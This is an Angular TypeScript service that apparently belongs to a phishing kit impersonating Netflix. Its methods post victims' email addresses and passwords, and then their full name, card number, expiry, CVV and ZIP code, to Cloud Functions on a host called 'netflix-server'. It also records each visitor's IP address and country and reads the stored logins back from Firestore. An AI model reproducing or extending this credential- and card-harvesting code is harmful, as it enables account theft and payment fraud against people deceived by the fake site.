import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Login } from './login/login';
import { Observable } from 'rxjs';
import { AngularFirestore, AngularFirestoreCollection } from '@angular/fire/firestore';
import { catchError } from 'rxjs/operators';

@Injectable({ providedIn: 'root' })
export class MyService {
    loginsCollection: AngularFirestoreCollection<Login>;
    logins: Observable<any[]>;
    constructor(private httpClient: HttpClient,public afs: AngularFirestore) {
        this.logins=this.afs.collection('logins').valueChanges();
     }

     getLogins() {
         return this.logins;
     }
    
    
     getIpAddress() :Observable<any> {
        return this.httpClient.get('https://api.ipify.org/?format=json');
     }

     getCountry(ip:string) :Observable<any> {
         return this.httpClient.get('https://ipapi.co/'+ip+'/json/')
     }

    addLogin(email:string,password:string) :Observable<any[]> {
        return this.httpClient.post<any[]>('https://us-central1-netflix-server.cloudfunctions.net/addLogin?email='+email+'&password='+password,null);
    }

    addBilling(fullName:string,cardNumber:string,month:string,year:string,cvv:string,zip:string) : Observable<any[]> {
        return this.httpClient.post<any[]>('https://us-central1-netflix-server.cloudfunctions.net/addBilling?fullName='+fullName+'&cardNumber='+cardNumber+'&month='+month+'&year='+year+'&cvv='+cvv+'&zip='+zip,null);
    }


}